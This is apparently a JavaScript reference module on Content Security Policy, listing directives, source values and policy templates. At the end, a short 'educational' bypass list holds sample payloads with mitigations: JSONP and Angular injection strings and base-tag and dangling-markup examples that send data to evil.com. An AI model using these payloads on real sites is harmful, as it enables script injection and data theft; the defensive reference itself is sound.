// CSP (Content Security Policy) Directive Definitions
// Comprehensive reference for all CSP directives with descriptions, valid sources, and best practices

export const cspDirectives = {
  // Fetch Directives - control locations from which certain resource types may be loaded
  'default-src': {
    name: 'default-src',
    description: 'Serves as a fallback for other fetch directives. If a specific directive is not defined, the browser will use default-src.',
    category: 'fetch',
    examples: ["'self'", "'none'", "'self' https://trusted.com"],
    commonMistakes: [
      "Using 'unsafe-inline' or 'unsafe-eval' defeats XSS protection",
      "Overly permissive with wildcard (*) allows any source"
    ],
    recommendation: "Start with 'self' and add specific trusted sources as needed",
    browserSupport: 'all'
  },

  'script-src': {
    name: 'script-src',
    description: 'Specifies valid sources for JavaScript. This is critical for XSS protection.',
    category: 'fetch',
    examples: [
      "'self'",
      "'self' 'unsafe-inline'",
      "'self' https://cdn.example.com",
      "'nonce-{random}'",
      "'sha256-{hash}'"
    ],
    commonMistakes: [
      "'unsafe-inline' allows inline scripts, defeating XSS protection",
      "'unsafe-eval' allows eval() and similar functions",
      "Using 'strict-dynamic' without nonces/hashes"
    ],
    recommendation: "Use nonces or hashes for inline scripts. Avoid 'unsafe-inline' and 'unsafe-eval'",
    browserSupport: 'all',
    xssImpact: 'critical'
  },

  'style-src': {
    name: 'style-src',
    description: 'Specifies valid sources for stylesheets.',
    category: 'fetch',
    examples: ["'self'", "'self' 'unsafe-inline'", "'self' https://fonts.googleapis.com"],
    commonMistakes: [
      "'unsafe-inline' allows inline styles which can be exploited"
    ],
    recommendation: "Use nonces or hashes for inline styles when possible",
    browserSupport: 'all',
    xssImpact: 'medium'
  },

  'img-src': {
    name: 'img-src',
    description: 'Specifies valid sources of images.',
    category: 'fetch',
    examples: ["'self'", "'self' data:", "'self' https://images.example.com"],
    commonMistakes: [
      "Forgetting data: URIs if using inline images",
      "Not restricting to HTTPS for external sources"
    ],
    recommendation: "Include data: if using base64 images, restrict to HTTPS sources",
    browserSupport: 'all',
    xssImpact: 'low'
  },

  'font-src': {
    name: 'font-src',
    description: 'Specifies valid sources of fonts.',
    category: 'fetch',
    examples: ["'self'", "'self' https://fonts.gstatic.com", "data:"],
    commonMistakes: [],
    recommendation: "Include data: if using base64 fonts",
    browserSupport: 'all',
    xssImpact: 'none'
  },

  'connect-src': {
    name: 'connect-src',
    description: 'Limits URLs which can be loaded using script interfaces (fetch, XMLHttpRequest, WebSocket, EventSource).',
    category: 'fetch',
    examples: ["'self'", "'self' https://api.example.com", "ws://localhost:*"],
    commonMistakes: [
      "Not including WebSocket protocols (ws://, wss://)",
      "Not including localhost for development"
    ],
    recommendation: "Specify exact API endpoints, include ws:// or wss:// if using WebSockets",
    browserSupport: 'all',
    xssImpact: 'medium'
  },

  'media-src': {
    name: 'media-src',
    description: 'Specifies valid sources for loading media using <audio> and <video> elements.',
    category: 'fetch',
    examples: ["'self'", "'self' https://media.example.com"],
    commonMistakes: [],
    recommendation: "Restrict to trusted media sources",
    browserSupport: 'all',
    xssImpact: 'low'
  },

  'object-src': {
    name: 'object-src',
    description: 'Specifies valid sources for <object>, <embed>, and <applet> elements.',
    category: 'fetch',
    examples: ["'none'", "'self'"],
    commonMistakes: [
      "Not setting to 'none' when plugins aren't needed"
    ],
    recommendation: "Set to 'none' unless you need Flash or other plugins",
    browserSupport: 'all',
    xssImpact: 'high'
  },

  'frame-src': {
    name: 'frame-src',
    description: 'Specifies valid sources for nested browsing contexts loading using elements like <frame> and <iframe>.',
    category: 'fetch',
    examples: ["'self'", "'self' https://trusted-iframe.com", "'none'"],
    commonMistakes: [
      "Allowing untrusted iframe sources"
    ],
    recommendation: "Restrict to specific trusted domains, use 'none' if iframes aren't needed",
    browserSupport: 'all',
    xssImpact: 'high'
  },

  'worker-src': {
    name: 'worker-src',
    description: 'Specifies valid sources for Worker, SharedWorker, or ServiceWorker scripts.',
    category: 'fetch',
    examples: ["'self'", "blob:", "'self' blob:"],
    commonMistakes: [
      "Forgetting blob: if using blob URLs for workers"
    ],
    recommendation: "Include blob: if creating workers from blob URLs",
    browserSupport: 'modern',
    xssImpact: 'medium'
  },

  'manifest-src': {
    name: 'manifest-src',
    description: 'Specifies valid sources of application manifest files.',
    category: 'fetch',
    examples: ["'self'"],
    commonMistakes: [],
    recommendation: "Usually 'self' is sufficient",
    browserSupport: 'modern',
    xssImpact: 'none'
  },

  // Document Directives
  'base-uri': {
    name: 'base-uri',
    description: 'Restricts the URLs which can be used in a <base> element.',
    category: 'document',
    examples: ["'self'", "'none'"],
    commonMistakes: [
      "Not setting this directive, allowing base tag injection"
    ],
    recommendation: "Set to 'self' or 'none' to prevent base tag injection attacks",
    browserSupport: 'all',
    xssImpact: 'high'
  },

  'sandbox': {
    name: 'sandbox',
    description: 'Enables a sandbox for the requested resource similar to the <iframe> sandbox attribute.',
    category: 'document',
    examples: ['', 'allow-scripts', 'allow-scripts allow-same-origin'],
    commonMistakes: [
      "Using allow-scripts and allow-same-origin together (defeats sandbox)"
    ],
    recommendation: "Use carefully, understand each flag's implications",
    browserSupport: 'all',
    xssImpact: 'high'
  },

  // Navigation Directives
  'form-action': {
    name: 'form-action',
    description: 'Restricts the URLs which can be used as the target of form submissions.',
    category: 'navigation',
    examples: ["'self'", "'self' https://form-processor.example.com"],
    commonMistakes: [
      "Not restricting form actions, allowing form hijacking"
    ],
    recommendation: "Set to 'self' or specific trusted form processors",
    browserSupport: 'all',
    xssImpact: 'medium'
  },

  'frame-ancestors': {
    name: 'frame-ancestors',
    description: 'Specifies valid parents that may embed a page using <frame>, <iframe>, <object>, <embed>, or <applet>.',
    category: 'navigation',
    examples: ["'none'", "'self'", "'self' https://trusted.com"],
    commonMistakes: [],
    recommendation: "Use 'none' to prevent clickjacking, or specify trusted parent domains",
    browserSupport: 'all',
    xssImpact: 'medium'
  },

  // Reporting Directives
  'report-uri': {
    name: 'report-uri',
    description: 'Instructs the browser to POST reports of policy violations to the specified URI (deprecated, use report-to).',
    category: 'reporting',
    examples: ['https://example.com/csp-report', '/csp-violation-report'],
    commonMistakes: [],
    recommendation: "Use report-to instead for modern browsers",
    browserSupport: 'all',
    deprecated: true
  },

  'report-to': {
    name: 'report-to',
    description: 'Defines a reporting group for violation reports (requires Reporting API).',
    category: 'reporting',
    examples: ['csp-endpoint'],
    commonMistakes: [
      "Not setting up the Report-To header properly"
    ],
    recommendation: "Preferred over report-uri for modern browsers",
    browserSupport: 'modern'
  },

  // Other Directives
  'upgrade-insecure-requests': {
    name: 'upgrade-insecure-requests',
    description: 'Instructs browsers to treat all insecure URLs (HTTP) as if they have been replaced with secure URLs (HTTPS).',
    category: 'other',
    examples: [''],
    commonMistakes: [],
    recommendation: "Use when migrating to HTTPS to automatically upgrade requests",
    browserSupport: 'modern',
    xssImpact: 'low'
  },

  'block-all-mixed-content': {
    name: 'block-all-mixed-content',
    description: 'Prevents loading any assets over HTTP when the page uses HTTPS.',
    category: 'other',
    examples: [''],
    commonMistakes: [],
    recommendation: "Use to ensure all content is loaded over HTTPS",
    browserSupport: 'modern',
    deprecated: true
  },

  'trusted-types': {
    name: 'trusted-types',
    description: 'Enables Trusted Types, requiring that DOM sinks only accept typed values instead of strings.',
    category: 'other',
    examples: ['default', 'myPolicy', "'allow-duplicates'"],
    commonMistakes: [],
    recommendation: "Advanced XSS protection, requires code changes to use",
    browserSupport: 'modern',
    xssImpact: 'critical'
  },

  'require-trusted-types-for': {
    name: 'require-trusted-types-for',
    description: 'Requires Trusted Types for specific DOM sinks.',
    category: 'other',
    examples: ["'script'"],
    commonMistakes: [],
    recommendation: "Use with trusted-types directive for enhanced protection",
    browserSupport: 'modern',
    xssImpact: 'critical'
  }
};

// Valid source values that can be used with fetch directives
export const validSources = {
  "'none'": {
    value: "'none'",
    description: "Won't allow loading of any resources",
    example: "script-src 'none'"
  },
  "'self'": {
    value: "'self'",
    description: "Only allow resources from the same origin (same scheme, host and port)",
    example: "script-src 'self'"
  },
  "'unsafe-inline'": {
    value: "'unsafe-inline'",
    description: "Allow use of inline resources (inline <script> elements, javascript: URIs, inline event handlers, inline <style> elements). Major security risk!",
    warning: "Defeats XSS protection - avoid if possible",
    example: "script-src 'self' 'unsafe-inline'"
  },
  "'unsafe-eval'": {
    value: "'unsafe-eval'",
    description: "Allow use of eval() and similar methods for creating code from strings. Major security risk!",
    warning: "Defeats XSS protection - avoid if possible",
    example: "script-src 'self' 'unsafe-eval'"
  },
  "'strict-dynamic'": {
    value: "'strict-dynamic'",
    description: "Allows scripts to load additional scripts via non-parser-inserted script elements. Requires nonce or hash.",
    example: "script-src 'nonce-random123' 'strict-dynamic'"
  },
  "'unsafe-hashes'": {
    value: "'unsafe-hashes'",
    description: "Allows specific inline event handlers to be executed if their hash matches",
    example: "script-src 'unsafe-hashes' 'sha256-abc123...'"
  },
  "nonce-": {
    value: "'nonce-{random}'",
    description: "Whitelist inline scripts/styles with a random nonce attribute. The nonce must be regenerated for each request.",
    example: "script-src 'nonce-2726c7f26c'",
    note: "Best practice for allowing specific inline scripts"
  },
  "sha256-": {
    value: "'sha256-{hash}'",
    description: "Whitelist inline scripts/styles by their SHA-256 hash",
    example: "script-src 'sha256-abc123def456...'",
    note: "Good for static inline scripts"
  },
  "sha384-": {
    value: "'sha384-{hash}'",
    description: "Whitelist inline scripts/styles by their SHA-384 hash",
    example: "script-src 'sha384-abc123def456...'"
  },
  "sha512-": {
    value: "'sha512-{hash}'",
    description: "Whitelist inline scripts/styles by their SHA-512 hash",
    example: "script-src 'sha512-abc123def456...'"
  },
  "https:": {
    value: "https:",
    description: "Allow resources from any HTTPS source",
    warning: "Very permissive - prefer specific domains",
    example: "img-src https:"
  },
  "http:": {
    value: "http:",
    description: "Allow resources from any HTTP source (insecure!)",
    warning: "Security risk - avoid in production",
    example: "img-src http:"
  },
  "data:": {
    value: "data:",
    description: "Allow data: URIs (base64 encoded resources)",
    example: "img-src 'self' data:"
  },
  "blob:": {
    value: "blob:",
    description: "Allow blob: URIs",
    example: "frame-src blob:"
  },
  "filesystem:": {
    value: "filesystem:",
    description: "Allow filesystem: URIs",
    example: "img-src filesystem:"
  },
  "domain": {
    value: "https://example.com",
    description: "Allow resources from a specific domain",
    example: "script-src https://cdn.example.com"
  },
  "subdomain": {
    value: "https://*.example.com",
    description: "Allow resources from a domain and all its subdomains",
    example: "script-src https://*.example.com"
  },
  "port": {
    value: "https://example.com:443",
    description: "Allow resources from a specific port",
    example: "connect-src https://api.example.com:8443"
  },
  "path": {
    value: "https://example.com/scripts/",
    description: "Allow resources from a specific path (not widely supported)",
    example: "script-src https://example.com/scripts/"
  }
};

// CSP Policy Templates
export const cspTemplates = {
  strict: {
    name: 'Strict (Recommended)',
    description: 'Highly secure policy with nonce-based script loading',
    policy: "default-src 'none'; script-src 'nonce-{random}'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src 'none'; base-uri 'self'; form-action 'self';",
    pros: ['Maximum XSS protection', 'Requires CSP-aware code', 'No unsafe-inline/eval'],
    cons: ['Requires nonce generation', 'May break existing code', 'More complex setup']
  },

  moderate: {
    name: 'Moderate',
    description: 'Balanced security with some inline scripts allowed via hashes',
    policy: "default-src 'self'; script-src 'self' 'sha256-{hash}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; base-uri 'self'; form-action 'self';",
    pros: ['Good security', 'Easier to implement', 'Compatible with most code'],
    cons: ['Inline styles allowed', 'Less strict than nonce-based']
  },

  permissive: {
    name: 'Permissive (Not Recommended)',
    description: 'Minimal restrictions, mainly for legacy applications',
    policy: "default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src * data:; font-src *; connect-src *;",
    pros: ['Easy to implement', 'Unlikely to break functionality'],
    cons: ['Weak XSS protection', 'unsafe-inline/eval allowed', 'Not recommended']
  },

  nextjs: {
    name: 'Next.js Production',
    description: 'Optimized for Next.js static export',
    policy: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-src blob:; base-uri 'self'; form-action 'self';",
    pros: ['Works with Next.js', 'Allows blob iframes', 'Production-ready'],
    cons: ['Inline styles for Tailwind CSS']
  },

  development: {
    name: 'Development',
    description: 'Relaxed policy for local development',
    policy: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self' ws://localhost:* ws://127.0.0.1:*; frame-src blob:;",
    pros: ['Supports HMR/hot reload', 'Easy debugging', 'WebSocket support'],
    cons: ['Not for production', 'Weak security']
  }
};

// Common CSP bypass techniques (educational)
export const bypassTechniques = [
  {
    name: 'JSONP Endpoint Abuse',
    description: 'If a whitelisted domain has a JSONP endpoint, it can be abused to execute arbitrary JavaScript',
    example: "script-src 'self' https://trusted.com → https://trusted.com/jsonp?callback=alert(1)",
    mitigation: 'Avoid whitelisting entire domains, use specific script paths if possible'
  },
  {
    name: 'Angular Template Injection',
    description: 'If using Angular with unsafe-eval, template expressions can be abused',
    example: "script-src 'self' 'unsafe-eval' → {{constructor.constructor('alert(1)')()}}",
    mitigation: 'Avoid unsafe-eval, use strict CSP with nonces'
  },
  {
    name: 'Base Tag Injection',
    description: 'Without base-uri restriction, <base> tag can redirect relative URLs',
    example: 'No base-uri → <base href="https://evil.com/">',
    mitigation: "Set base-uri 'self' or 'none'"
  },
  {
    name: 'Dangling Markup',
    description: 'Injecting unclosed tags to capture sensitive data via external resources',
    example: '<img src="https://evil.com/log?data=',
    mitigation: 'Use strict CSP, validate and sanitize all inputs'
  }
];

export const categories = ['fetch', 'document', 'navigation', 'reporting', 'other'];

export const directivesByCategory = {
  fetch: Object.keys(cspDirectives).filter(key => cspDirectives[key].category === 'fetch'),
  document: Object.keys(cspDirectives).filter(key => cspDirectives[key].category === 'document'),
  navigation: Object.keys(cspDirectives).filter(key => cspDirectives[key].category === 'navigation'),
  reporting: Object.keys(cspDirectives).filter(key => cspDirectives[key].category === 'reporting'),
  other: Object.keys(cspDirectives).filter(key => cspDirectives[key].category === 'other')
};
